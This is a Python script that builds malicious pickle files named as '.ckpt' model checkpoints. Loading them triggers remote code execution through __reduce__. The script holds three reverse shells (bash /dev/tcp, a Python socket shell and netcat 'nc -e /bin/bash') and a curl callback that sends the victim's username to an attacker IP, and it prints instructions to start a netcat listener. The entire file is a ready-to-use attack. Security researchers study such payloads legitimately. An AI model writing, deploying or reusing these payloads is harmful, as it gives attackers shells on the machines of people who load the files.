#!/usr/bin/env python3
"""
Reverse Shell Payload - Alternative to SSH Key Injection
"""

import pickle
import os

class ReverseShellPayload:
    """Reverse shell payload that connects back to attacker"""
    
    def __init__(self, attacker_ip="192.168.45.168", attacker_port="4444"):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
    
    def __reduce__(self):
        """Create reverse shell connection"""
        import os
        # Using bash reverse shell
        command = f'bash -c "bash -i >& /dev/tcp/{self.attacker_ip}/{self.attacker_port} 0>&1"'
        return (os.system, (command,))

class PythonReverseShell:
    """Python reverse shell payload"""
    
    def __init__(self, attacker_ip="192.168.45.168", attacker_port="4444"):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
    
    def __reduce__(self):
        """Python reverse shell"""
        import os
        command = f'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.attacker_ip}\",{self.attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"])"'
        return (os.system, (command,))

class NetcatReverseShell:
    """Netcat reverse shell payload"""
    
    def __init__(self, attacker_ip="192.168.45.168", attacker_port="4444"):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
    
    def __reduce__(self):
        """Netcat reverse shell"""
        import os
        command = f'nc -e /bin/bash {self.attacker_ip} {self.attacker_port}'
        return (os.system, (command,))

class CallbackTestPayload:
    """Simple HTTP callback to test if deserialization works"""
    
    def __init__(self, attacker_ip="192.168.45.168", attacker_port="8000"):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
    
    def __reduce__(self):
        """Make HTTP callback to verify execution"""
        import os
        command = f'curl "http://{self.attacker_ip}:{self.attacker_port}/callback?success=1&user=$(whoami)&date=$(date)"'
        return (os.system, (command,))

def create_reverse_shell_payloads():
    """Create reverse shell payloads"""
    print("Creating reverse shell payloads...")
    
    # Create different reverse shell variants
    payloads = [
        (ReverseShellPayload(), 'payload_reverse_bash.ckpt'),
        (PythonReverseShell(), 'payload_reverse_python.ckpt'),
        (NetcatReverseShell(), 'payload_reverse_nc.ckpt'),
        (CallbackTestPayload(), 'payload_callback_test.ckpt')
    ]
    
    for payload, filename in payloads:
        with open(filename, 'wb') as f:
            pickle.dump(payload, f)
        print(f"[+] Created: {filename} ({os.path.getsize(filename)} bytes)")
    
    print("\n[+] Reverse shell payloads created!")
    print("[!] Start listener: nc -lvnp 4444")
    print("[!] Then test payload: payload_reverse_bash.ckpt")

if __name__ == "__main__":
    create_reverse_shell_payloads()
